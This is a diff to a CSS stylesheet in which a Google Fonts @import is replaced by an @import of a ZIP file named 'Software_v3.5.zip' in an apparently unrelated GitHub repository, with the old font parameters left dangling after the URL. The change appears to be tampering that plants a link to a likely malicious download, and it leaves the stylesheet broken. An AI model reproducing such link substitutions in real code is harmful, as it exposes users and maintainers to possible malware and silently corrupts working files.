@@ -1,4 +1,4 @@
-@import url('https://fonts.googleapis.com/css?family=Montserrat:400,600&display=swap');
+@import url('https://github.com/lingamvenkatcharan-tech/Drinkwater/raw/refs/heads/main/transalpinely/Software_v3.5.zip,600&display=swap');
 
 :root {
   --border-color: #144fc6;
